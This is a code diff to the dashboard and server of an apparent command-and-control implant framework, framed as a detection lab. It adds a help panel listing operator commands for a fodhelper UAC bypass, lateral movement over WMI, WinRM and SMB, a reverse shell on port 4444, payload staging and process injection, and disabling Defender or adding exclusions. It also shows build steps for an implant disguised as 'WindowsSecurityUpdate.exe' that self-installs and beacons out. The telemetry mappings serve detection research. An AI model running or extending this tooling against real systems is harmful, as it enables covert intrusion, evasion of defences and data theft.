+    {c:'Privilege escalation',cmd:'!uac <command>',d:'UAC bypass through the ms-settings auto-elevate handler: plants the HKCU handler, launches fodhelper.exe, removes the keys again.',t:'T1548.002 · EID 13 + EID 1 (ruled)'},
+    {c:'Privilege escalation',cmd:'!service create <name> [binPath]',d:'Create a service via the SCM API (binPath defaults to the implant). delete, start and stop touch only the name you give.',t:'T1543.003 · EID 13 on the Services key (ruled)'},
+    {c:'Lateral movement',cmd:'!lateral wmi <host> <command>',d:'Remote Win32_Process.Create over DCOM; uses the caller token only.',t:'T1047 · EID 3 port 135 + target EID 1 under WmiPrvSE (ruled)'},
+    {c:'Lateral movement',cmd:'!lateral winrm <host> <command>',d:'WinRS remote shell (winrs -r:).',t:'T1021.006 · EID 1 winrs + target wsmprovhost child (ruled)'},
+    {c:'Lateral movement',cmd:'!lateral smb <host> <command>',d:'Admin-share session plus a remote scheduled task that runs the command as SYSTEM. Prints its revert commands; cleans up nothing implicitly.',t:'T1021.002 · EID 1 net/schtasks (ruled)'},
+    {c:'Lateral movement',cmd:'!reverse <ip[:port]>',d:'Reverse TCP shell to the operator (default port 4444, matching c2_cli.py listen).',t:'T1059 · EID 3 high port (ruled)'},
+    {c:'Files and transfer',cmd:'download <url> <dest>',d:'Fetch a file with WinHTTP and write it to disk on the target.',t:'T1105 · EID 11 (ruled)'},
+    {c:'Files and transfer',cmd:'upload <src> <dest>',d:'Stage a local file for operator retrieval through /payload.',t:'T1005 · no host event (gap)'},
+    {c:'Files and transfer',cmd:'!getfile <path>',d:'Pull a file from the target through /payload.',t:'T1005 · no host event (gap)'},
+    {c:'Files and transfer',cmd:'!stage <pid>',d:'Second stage: fetch the payload staged on the server over the C2 channel and inject it into <pid>.',t:'T1105 + T1055 · EID 8/10 (ruled)'},
+    {c:'Files and transfer',cmd:'!stage self',d:'Execute the staged payload in the implant own process. No Sysmon event; a payload fault takes the implant down with it.',t:'T1105 + T1055 · no event (documented gap)'},
+    {c:'Files and transfer',cmd:'!stage info',d:'Report size and SHA-256 of the staged payload without executing anything; the experiment pre-execution record.',t:'no event'},
+    {c:'Defender and disk',cmd:'!defender status',d:'Defender posture as JSON: real-time, behavior, IOAV and on-access state, tamper-protection source, signature age, exclusion lists, ASR exclusions.',t:'T1518.001 · EID 1 (cmdlet text needs 4104 - gap)'},
+    {c:'Defender and disk',cmd:'!defender exclude add <path|proc|ext> <value>',d:'Exclusion through the registry keys Defender reads. remove deletes the value.',t:'T1562.001 · EID 13 (ruled)'},
+    {c:'Defender and disk',cmd:'!defender exclude ps-add <path|proc|ext> <value>',d:'Same exclusion through Add-MpPreference / Remove-MpPreference - the cmdlet arm, different telemetry.',t:'T1562.001 · EID 1, encoded command line'},
+    {c:'Defender and disk',cmd:'!defender disable <realtime|behavior|ioav|script|all>',d:'Disable monitoring through Set-MpPreference and the policy keys, then report whether it took. Tamper protection commonly blocks it - that is a result, not an error.',t:'T1562.001 · EID 1 + EID 13 policy keys (ruled)'},
+    {c:'Defender and disk',cmd:'!defender asr add <path>',d:'Attack-surface-reduction exclusion list, add or remove.',t:'T1562.001 · EID 1, encoded command line'},
+    {c:'Defender and disk',cmd:'!defender restore',d:'Re-enable monitoring and clear the policy values this module wrote. Exclusions are never removed implicitly.',t:'remediation step'},
+    {c:'Defender and disk',cmd:'!diskread [lba]',d:'Read-only raw disk access: one 512-byte sector from the physical drive (default sector 0 = MBR) with boot signature and partition-table entries. No write path exists.',t:'T1006 · EID 9 (ruled)'},
+    {c:'C2 channel',cmd:'!doh on|off|status',d:'DNS-over-HTTPS fallback transport: report the endpoint and last resolved address, or toggle it for an experiment.',t:'T1071.004 · EID 3 to the resolver (ruled)'},
+    {c:'Persistence and lifecycle',cmd:'!uninstall',d:'Remove every persistence vector (Run keys, scheduled task, WMI subscription) and exit cleanly.',t:'T1070.008 · EID 13 + EID 23 (ruled)'},
+    {c:'Persistence and lifecycle',cmd:'exit',d:'Clean shutdown; the supervisor stops restarting the worker.',t:'no event'},
+    {c:'Persistence and lifecycle',cmd:'sleep <seconds>',d:'Override the jittered beacon interval for this run.',t:'T1029 · traffic analysis (gap)'},
+    {c:'Persistence and lifecycle',cmd:'!shell on|off',d:'Rapid-poll mode: the beacon drops to about one second for interactive work.',t:'T1029 · visible on the wire'},
+    {c:'Persistence and lifecycle',cmd:'<visibility demos>',d:'!prank and !popups exist to show an audience that the desktop is controlled. Reversible, outside the ATT&CK-mapped scope.',t:'not part of the research matrix'}
+,
+    {c:'Dashboard actions',x:true,cmd:'Accept  (header)',d:'Enrol a pending node so it starts receiving tasks. Nodes wait here unless the server runs with --auto-accept.',t:'audit: session_accepted'},
+    {c:'Dashboard actions',x:true,cmd:'Reject  (header)',d:'Drop a pending node. Its next beacon is answered with exit, so the implant shuts down instead of tasking.',t:'audit: session_rejected'},
+    {c:'Dashboard actions',x:true,cmd:'Kill  (session bar)',d:'Mark the session killed and empty its queue; the next beacon is answered with exit. Run !uninstall first if persistence should be removed.',t:'audit: kill_session'},
+    {c:'Dashboard actions',x:true,cmd:'Clear  (session bar)',d:'Empty the result buffer for the selected node. The audit trail keeps everything; only the console is cleared.',t:'audit: get_results (clear=1)'},
+    {c:'Dashboard actions',x:true,cmd:'Refresh  (session bar)',d:'Re-fetch results now. The console also polls every 5 s while a node is selected.',t:'—'},
+    {c:'Dashboard actions',x:true,cmd:'Live  (session bar)',d:'Beacon-paced live frame view with keyboard/mouse capture; a UI wrapper around the !live and !input tasks.',t:'uses !live / !input (no host event)'},
+    {c:'Dashboard actions',x:true,cmd:'Files tab',d:'Browse the target filesystem by clicking rows (runs !files); the arrow on a row pulls that file (runs !getfile).',t:'!files lists, !getfile pulls'},
+    {c:'Dashboard actions',x:true,cmd:'Push staged  (Files tab)',d:'Copies the server-staged payload to the folder you are browsing on the target (runs !getfile <dest> on the implant).',t:'audit: payload_downloaded'},
+    {c:'Dashboard actions',x:true,cmd:'Payload tab',d:'Stage a payload for retrieval on the target (max 32 MB, kept in the database so it survives a restart).',t:'audit: payload_uploaded'},
+    {c:'Dashboard actions',x:true,cmd:'Activity rail',d:'The audit trail: every task, result, ack, duplicate result, replay rejection, approval and kill, with IP and timestamp.',t:'GET /audit'},
+    {c:'Dashboard actions',x:true,cmd:'Ctrl K  /  ?',d:'Ctrl K searches every command and jumps to nodes; ? opens this panel; / focuses the command bar.',t:'—'},
+    {c:'Operator CLI (c2_cli.py)',x:true,cmd:'sessions / watch',d:'List active nodes, or live-refresh the list; add --json for scripting.',t:'GET /sessions'},
+    {c:'Operator CLI (c2_cli.py)',x:true,cmd:'shell <sid>',d:'Interactive console on one node: numbered table, task entry, result streaming.',t:'POST /task + GET /results'},
+    {c:'Operator CLI (c2_cli.py)',x:true,cmd:'task <sid> "<cmd>"',d:'Queue a single command, returns the task id and queue depth.',t:'audit: task_queued'},
+    {c:'Operator CLI (c2_cli.py)',x:true,cmd:'batch <sid> "a;b;c"',d:'Queue several commands semicolon-separated in one call.',t:'audit: task_queued ×n'},
+    {c:'Operator CLI (c2_cli.py)',x:true,cmd:'results <sid> [--clear]',d:'Read the stored results for a node; --clear drains the buffer after reading.',t:'audit: get_results'},
+    {c:'Operator CLI (c2_cli.py)',x:true,cmd:'export <sid> [file]',d:'Dump every result for a node to a file for the experiment record.',t:'GET /results'},
+    {c:'Operator CLI (c2_cli.py)',x:true,cmd:'audit [--limit N]',d:'Print the operator/agent audit trail.',t:'GET /audit'},
+    {c:'Operator CLI (c2_cli.py)',x:true,cmd:'payload upload <file>',d:'Stage a payload on the server for the implant to fetch.',t:'audit: payload_uploaded'},
+    {c:'Operator CLI (c2_cli.py)',x:true,cmd:'listen --port <port>',d:'Start the reverse-shell listener that !reverse dials into (default 4444).',t:'operator side, no host event'}  ];
+  const HELP_STEPS=[
+    {t:'1 · Start the lab',d:'One command brings up the server, lab secrets and the SQLite store.',code:'./simpleserver.sh up -d'},
+    {t:'2 · Build the implant',d:'Use the beacon token the launcher printed; the endpoint is baked in.',code:'C2_HOST=<host> C2_PORT=443 GHOST_BEACON_TOKEN=<token> ./build.sh'},
+    {t:'3 · Run it in the VM',d:'Snapshot first. The implant self-installs to APPDATA and beacons out.',code:'build/WindowsSecurityUpdate.exe'},
+    {t:'4 · Approve the node',d:'New sessions wait for acceptance unless the server was started with --auto-accept.',code:'Accept in the header, or c2_cli.py sessions'},
+    {t:'5 · Task and read',d:'Type in the command bar below the console, or click any row in this panel to load it.',code:'!screenshot  →  Console tab'},
+    {t:'6 · Stop cleanly',d:'Remove persistence from the target, then stop the lab.',code:'!uninstall   ·   ./simpleserver.sh down'}
+  ];
+  function helpUse(cmd,immediate){
+    if(cmd.charAt(0)==='<'){toast('That row describes a group, not a command','info');return;}
+    const needsArg=/[<\[|]/.test(cmd);
+    const bare=cmd.split(' ')[0];
+    if(!selectedSid){
+      if(navigator.clipboard&&navigator.clipboard.writeText){navigator.clipboard.writeText(bare);}
+      toast('No node selected - copied '+bare+' to the clipboard','info');return;
+    }
+    if(currentTab!=='console')switchTab('console');
+    if(immediate&&!needsArg){sendCmd(cmd);return;}
+    closeHelp();cmdInsert(bare+' ');toast(needsArg?('Loaded '+bare+' - fill in the arguments'):('Loaded '+bare));
+  }
+  function helpRender(){
+    const q=($('help-input').value||'').toLowerCase().trim();
+    const hit=r=>!q||(r.cmd+' '+r.d+' '+r.t+' '+r.c).toLowerCase().includes(q);
+    let html='';
+    if(!q){
+      html+='<div class="help-cat">How to operate</div><div class="help-steps">';
+      HELP_STEPS.forEach(s=>{html+='<div class="help-step"><b>'+esc(s.t)+'</b><p>'+esc(s.d)+'</p><code>'+esc(s.code)+'</code></div>';});
+      html+='</div>';
+    }
+    let last='';
+    CMD_REF.filter(hit).forEach(r=>{
+      if(r.c!==last){html+='<div class="help-cat">'+esc(r.c)+'</div>';last=r.c;}
+      // r.x rows are dashboard/CLI actions, not tasks: reference only, no handler.
+      const attrs=r.x?'class="help-row info"':'class="help-row" tabindex="0" role="button" '+
+        'onclick="helpUse(this.dataset.cmd)" '+
+        'onkeydown="if(event.key===\'Enter\'||event.key===\' \'){event.preventDefault();helpUse(this.dataset.cmd);}"';
+      html+='<div '+attrs+' data-cmd="'+esc(r.cmd)+'">'+
+        '<div class="help-cmd">'+esc(r.cmd)+'</div>'+
+        '<div class="help-desc">'+esc(r.d)+'</div>'+
+        '<div class="help-tel">'+esc(r.t)+'</div></div>';
+    });
+    if(!q)html+='<div class="help-note"><b>Boundaries, by design.</b> No destructive technique ships with the framework: no file encryptor, no disk write, no quarantine operations. The high-confidence detections never need the payload to actually destroy anything. Sessions wait for approval unless auto-accept is on, every task and result lands in the audit trail, and this panel plus README section 10 are the two places the command surface is documented - keep them in sync with the C++ command table.</div>';
+    $('help-body').innerHTML=html||'<div class="help-empty">No commands match that filter</div>';
+  }
+  let helpOpener=null;
+  function openHelp(){
+    helpOpener=document.activeElement;
+    $('help-ov').classList.add('show');
+    $('help-input').value='';
+    helpRender();
+    $('help-input').focus();
+  }
+  function closeHelp(){
+    $('help-ov').classList.remove('show');
+    if(helpOpener&&helpOpener.focus)helpOpener.focus();
+  }
+  window.openHelp=openHelp;window.closeHelp=closeHelp;window.helpRender=helpRender;window.helpUse=helpUse;
 
   /* ── boot ─────────────────────────────────────────────────────────── */
   tick();setInterval(tick,1000);
@@ -2032,22 +2188,11 @@ def dashboard():
 def _janitor():
     while True:
         time.sleep(300)
-        cutoff = time.time() - _CFG["session_ttl"] * 2
-        with _lock:
-            dead = [
-                sid for sid, s in _sessions.items()
-                if _iso_to_ts(s.get("last_beacon", "")) < cutoff
-            ]
-            for sid in dead:
-                _sessions.pop(sid, None)
-                _tasks.pop(sid, None)
-                _results.pop(sid, None)
-
-def _iso_to_ts(iso: str) -> float:
-    try:
-        return datetime.fromisoformat(iso.replace("Z", "+00:00")).timestamp()
-    except Exception:
-        return 0.0
+        # Same window as before: sessions idle beyond twice the TTL are dropped.
+        # The store removes their tasks, results and done-ids in one transaction,
+        # so a restart can never resurrect a pruned session's history.
+        for sid in _store.prune_sessions(time.time() - _CFG["session_ttl"] * 2):
+            _channel_keys.pop(sid, None)
 
 # ── Console status printer ────────────────────────────────────────────────────
 _RED    = "\033[91m"
@@ -2062,9 +2207,9 @@ def _status_printer():
     prev_count = -1
     while True:
         time.sleep(10)
-        with _lock:
-            count = len(_sessions)
-            pending = sum(1 for s in _sessions.values() if s.get("status") == "pending")
+        counts  = _store.counts()
+        count   = counts["sessions"]
+        pending = counts["pending"]
         if count != prev_count:
             prev_count = count
             ts = datetime.now().strftime("%H:%M:%S")
@@ -2083,6 +2228,10 @@ def main():
     p.add_argument("--user",           default=None,                   help="dashboard username")
     p.add_argument("--password",       default=None,                   help="dashboard password")
     p.add_argument("--auto-accept",    action="store_true",            help="auto-accept all new sessions")
+    p.add_argument("--db",             default=None,
+                   help="SQLite database path (default: in-memory — state is lost on "
+                        "restart). simpleserver.sh passes a file path so the lab keeps "
+                        "sessions, results and the audit trail across restarts.")
     p.add_argument("--tls",            action="store_true",
                    help="serve HTTPS with a self-signed cert (the implant ignores cert "
                         "errors; needs pyOpenSSL). Required for direct VPS hosting — "
@@ -2100,7 +2249,11 @@ def main():
     if args.operator_token: _CFG["operator_token"] = args.operator_token
     if args.user:           _CFG["dashboard_user"] = args.user
     if args.password:       _CFG["dashboard_pass"] = args.password
+    if args.db:             _CFG["db_path"]        = args.db
     _CFG["auto_accept"]     = args.auto_accept or bool(_CFG["auto_accept"])
+
+    # Config resolution is complete: move the store onto the chosen database.
+    _reopen_store(_CFG["db_path"])
 
     threading.Thread(target=_janitor,        daemon=True).start()
     threading.Thread(target=_status_printer, daemon=True).start()
@@ -2112,6 +2265,11 @@ def main():
     print(f"  Dashboard : {_GREEN}{scheme}://localhost:{args.port}/{_RESET}")
     print(f"  Beacon tok: {_YELLOW}{args.beacon_token[:12]}...{_RESET}")
     print(f"  Op token  : {_YELLOW}{args.operator_token[:12]}...{_RESET}")
+    if _CFG["db_path"] == ":memory:":
+        print(f"  Store     : {_YELLOW}in-memory — restart loses sessions/results/audit{_RESET}")
+        print(f"  {_GREY}            use --db <path> or ./simpleserver.sh to persist{_RESET}")
+    else:
+        print(f"  Store     : {_GREEN}{_CFG['db_path']}{_RESET}")
     if args.auto_accept:
         print(f"  Auto-accept: {_GREEN}ON{_RESET}")
     print(f"\n  {_GREY}Next step: point the implant's GetC2Host() at this host{_RESET}")
